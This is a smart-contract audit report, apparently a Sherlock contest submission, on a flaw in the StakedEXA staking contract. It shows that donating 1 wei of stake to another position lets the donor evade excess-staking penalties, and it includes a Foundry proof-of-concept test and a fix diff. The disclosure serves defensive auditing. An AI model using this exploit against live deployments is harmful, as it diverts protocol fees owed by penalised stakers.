Deep Concrete Goose

Medium

# Stake Donation Evades Excess Staking Penalties

## Summary

By making a negligible donation to another staked position, the donator can avoid excess staking penalties to their own position indefinitely, allowing them to retain peak profitability for inoptimal stake durations.

## Vulnerability Detail

In the override of [`_update(address,address,uint256)`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/3eb87e3edf3bcd57c4cc1c6a73e8255f575b76de/protocol/contracts/StakedEXA.sol#L129C12-L129C61) in [`StakedEXA`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/main/protocol/contracts/StakedEXA.sol), we can see that when minting new vault shares, the sequence will attempt to claim partial rewards:

```solidity
for (uint256 i = 0; i < rewardsTokens.length; ++i) {
  IERC20 reward = rewardsTokens[i];
  updateIndex(reward);

  if (time > memRefTime) {
    if (balance != 0) claimWithdraw(reward, to, balance);
    avgIndexes[to][reward] = rewards[reward].index;
  } else {
@>  if (balance != 0) claim_(reward); /// @audit rewards_are_partially_claimed
    uint256 numerator = avgIndexes[to][reward] * balance + rewards[reward].index * amount;
    avgIndexes[to][reward] = numerator == 0 ? 0 : (numerator - 1) / total + 1;
  }
}
```

Notice that when `time < memRefTime`, rewards for the caller are claimed via a call to [`claim_(address)`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/3eb87e3edf3bcd57c4cc1c6a73e8255f575b76de/protocol/contracts/StakedEXA.sol#L371C12-L371C33). The implementation of [`claim(address)`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/3eb87e3edf3bcd57c4cc1c6a73e8255f575b76de/protocol/contracts/StakedEXA.sol#L371C12-L371C33) is outlined below, and we have taken the opportunity to annotate all of the references to `msg.sender` made by the call:

```solidity
/// @notice Internal function to claim rewards.
/// @param reward The reward token.
function claim_(IERC20 reward) internal whenNotPaused {
@> uint256 time = block.timestamp * 1e18 - avgStart[msg.sender];
  if (time <= minTime * 1e18) return;

@> uint256 claimedAmount = claimed[msg.sender][reward];

  // due to excess exposure
@>uint256 claimableAmount = Math.max(rawClaimable(reward, msg.sender, balanceOf(msg.sender)), claimedAmount);
  uint256 claimAmount = claimableAmount - claimedAmount;

@> if (claimAmount != 0) claimed[msg.sender][reward] = claimedAmount + claimAmount;

  if (time > refTime * 1e18) {

@>  uint256 rawEarned = earned(reward, msg.sender, balanceOf(msg.sender));
@>  uint256 savedAmount = saved[msg.sender][reward];
    uint256 maxClaimed = Math.min(rawEarned, claimableAmount);
    uint256 saveAmount = rawEarned > maxClaimed + savedAmount ? rawEarned - maxClaimed - savedAmount : 0;

    if (saveAmount != 0) {
@>    saved[msg.sender][reward] = savedAmount + saveAmount;
      reward.transfer(savings, saveAmount);
    }
  }
  if (claimAmount != 0) {
@>  reward.transfer(msg.sender, claimAmount);
@>  emit RewardPaid(reward, msg.sender, claimAmount);
  }
}
```

Remember that this call to [`claim_(address)`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/3eb87e3edf3bcd57c4cc1c6a73e8255f575b76de/protocol/contracts/StakedEXA.sol#L371C12-L371C33) occurs within the internal [`_update(address,address,uint256)`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/3eb87e3edf3bcd57c4cc1c6a73e8255f575b76de/protocol/contracts/StakedEXA.sol#L129C12-L129C61) hook override, which takes place during minting.

Minting can occur in one of two scenarios:
1. The common case where the `msg.sender` indeed attempts to mint new vault shares to their own position.
2. When the `msg.sender` instead **donates** minted vault shares to a specified `receiver` address.

If we consider the donation case, we can determine that the logic of the [`_update(address,address,uint256)`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/3eb87e3edf3bcd57c4cc1c6a73e8255f575b76de/protocol/contracts/StakedEXA.sol#L129C12-L129C61) function will reference the `to` address (the recipient of the donated stake) meanwhile the [`claim_(address)`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/3eb87e3edf3bcd57c4cc1c6a73e8255f575b76de/protocol/contracts/StakedEXA.sol#L371C12-L371C33) function will reference the `msg.sender` (the donator).

In summary:

```solidity
} else {
@> if (balance != 0) claim_(reward); /// @audit we_claim_for_msg_sender
  uint256 numerator = avgIndexes[to][reward] * balance + rewards[reward].index * amount;
@> avgIndexes[to][reward] = numerator == 0 ? 0 : (numerator - 1) / total + 1; /// @audit but_we_update_receiver_indexes
}
```

This discrepancy can ultimately be exploited.

### StakedEXA.t.sol

```solidity
/// @notice By making a small donation to a large staked, position,
/// @notice the penalties inflicted on excessive stakes are nullified.
/// @param immortalStakeEnabled Controls whether `c0ffee` evades excess staking penalties.
function testSherlockSubvertExcessStakingPenalities(
  bool immortalStakeEnabled
) external {

  /// @notice We'll use two addresses; `c0ffee` and `deadbeef`. Both
  /// @notice accounts will start on equal-footing; they will make an
  /// @notice equal-sized deposit at the exact same time:
  address c0ffee = address(0xc0ffee);
  address deadbeef = address(0xdeadbeef);
  uint256 depositAmount = 1 ether;
  vm.prank(c0ffee);
    exa.approve(address(stEXA), type(uint256).max);
  vm.prank(deadbeef);
    exa.approve(address(stEXA), type(uint256).max);
  exa.mint(c0ffee, depositAmount);
  exa.mint(deadbeef, depositAmount);
  vm.prank(c0ffee);
    stEXA.deposit(depositAmount, c0ffee);
  vm.prank(deadbeef);
    stEXA.deposit(depositAmount, deadbeef);

  /// @notice Here, we'll decide whether to execute the exploit. When
  /// @notice enabled, `c0ffee` will make an insignificant donation of `1 wei`
  /// @notice to `deadbeef`.
  /// @notice Remember, this has to take place whilst the stake duration is less
  /// @notice than the `refTime`:
  skip(duration - 1);
  if (immortalStakeEnabled /* grant_c0ffee_immortality */) {
    uint256 attackAmount = 1 wei;
    exa.mint(c0ffee, attackAmount);
    vm.prank(c0ffee);
      stEXA.deposit(attackAmount, deadbeef);
  }

  skip(1) /* optimal_stake_here */;

  /// @notice Let's assume both positions are inoptimal and are
  /// @notice not unstaked until long after the `refTime`. In this
  /// @notice scenario, we should expect both accounts to suffer
  /// @notice a penalty.
  skip(1_000 weeks);

  /// @notice Finally, let's have both accounts unstake and
  /// @notice compare the results.
  vm.startPrank(c0ffee);
    stEXA.redeem(stEXA.balanceOf(c0ffee), c0ffee, c0ffee);
  vm.stopPrank();
  vm.startPrank(deadbeef);
    stEXA.redeem(stEXA.balanceOf(deadbeef), deadbeef, deadbeef);
  vm.stopPrank();

  /// @audit Notice that when `c0ffee` attempts the immortal stake hack,
  /// @audit regardless of how inoptimal their stake duration, they
  /// @audit may retain peak profitability. `deadbeef`, by contrast,
  /// @audit is subject to penalties as anticipated.
  assertEq(exa.balanceOf(c0ffee),   immortalStakeEnabled ? 500999929609020041241 : 256859374999997301400);
  assertEq(exa.balanceOf(deadbeef), immortalStakeEnabled ? 256859374999997301399 : 256859374999997301400);

}
```

For these two equal stakes with inoptimal excess staking durations, let's compare the outcome:

| Immortality? | `deadbeef`              | `c0ffee`                |
|--------------|-------------------------|-------------------------|
| Yes          | `256859374999997301399` | `500999929609020041241` |
| No           | `256859374999997301400` | `256859374999997301400` |

As we can see, `c0ffee`'s exploit has been effective at evading excess staking penalties.

## Impact

Loss of due protocol fee accrual for economically-inefficient stakes.

## Code Snippet

```solidity
/// @notice Internal function to claim rewards.
/// @param reward The reward token.
function claim_(IERC20 reward) internal whenNotPaused {
  uint256 time = block.timestamp * 1e18 - avgStart[msg.sender];
  if (time <= minTime * 1e18) return;

  uint256 claimedAmount = claimed[msg.sender][reward];

  // due to excess exposure
  uint256 claimableAmount = Math.max(rawClaimable(reward, msg.sender, balanceOf(msg.sender)), claimedAmount);
  uint256 claimAmount = claimableAmount - claimedAmount;

  if (claimAmount != 0) claimed[msg.sender][reward] = claimedAmount + claimAmount;

  if (time > refTime * 1e18) {

    uint256 rawEarned = earned(reward, msg.sender, balanceOf(msg.sender));
    uint256 savedAmount = saved[msg.sender][reward];
    uint256 maxClaimed = Math.min(rawEarned, claimableAmount);
    uint256 saveAmount = rawEarned > maxClaimed + savedAmount ? rawEarned - maxClaimed - savedAmount : 0;

    if (saveAmount != 0) {
      saved[msg.sender][reward] = savedAmount + saveAmount;
      reward.transfer(savings, saveAmount);
    }
  }
  if (claimAmount != 0) {
    reward.transfer(msg.sender, claimAmount);
    emit RewardPaid(reward, msg.sender, claimAmount);
  }
}
```

## Tool used

Manual Review

## Recommendation

Update the [`claim(address)`](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/3eb87e3edf3bcd57c4cc1c6a73e8255f575b76de/protocol/contracts/StakedEXA.sol#L369C3-L397C4) function and fulfil starved data inputs.

```diff
/// @notice Internal function to claim rewards.
/// @param reward The reward token.
+ /// @param account The account to claim from.
- function claim_(IERC20 reward) internal whenNotPaused {
+ function claim_(IERC20 reward, address account) internal whenNotPaused {
- uint256 time = block.timestamp * 1e18 - avgStart[msg.sender];
+ uint256 time = block.timestamp * 1e18 - avgStart[account];
  if (time <= minTime * 1e18) return;

- uint256 claimedAmount = claimed[msg.sender][reward];
+ uint256 claimedAmount = claimed[account][reward];

  // due to excess exposure
- uint256 claimableAmount = Math.max(rawClaimable(reward, msg.sender, balanceOf(msg.sender)), claimedAmount);
+ uint256 claimableAmount = Math.max(rawClaimable(reward, account, balanceOf(account)), claimedAmount);
  uint256 claimAmount = claimableAmount - claimedAmount;

- if (claimAmount != 0) claimed[msg.sender][reward] = claimedAmount + claimAmount;
+ if (claimAmount != 0) claimed[account][reward] = claimedAmount + claimAmount;

  if (time > refTime * 1e18) {

-   uint256 rawEarned = earned(reward, msg.sender, balanceOf(msg.sender));
+   uint256 rawEarned = earned(reward, account, balanceOf(account));
-   uint256 savedAmount = saved[msg.sender][reward];
+   uint256 savedAmount = saved[account][reward];
    uint256 maxClaimed = Math.min(rawEarned, claimableAmount);
    uint256 saveAmount = rawEarned > maxClaimed + savedAmount ? rawEarned - maxClaimed - savedAmount : 0;

    if (saveAmount != 0) {
-     saved[msg.sender][reward] = savedAmount + saveAmount;
+     saved[account][reward] = savedAmount + saveAmount;
      reward.transfer(savings, saveAmount);
    }
  }
  if (claimAmount != 0) {
-   reward.transfer(msg.sender, claimAmount);
+   reward.transfer(account, claimAmount);
-   emit RewardPaid(reward, msg.sender, claimAmount);
+   emit RewardPaid(reward, account, claimAmount);
  }
}
```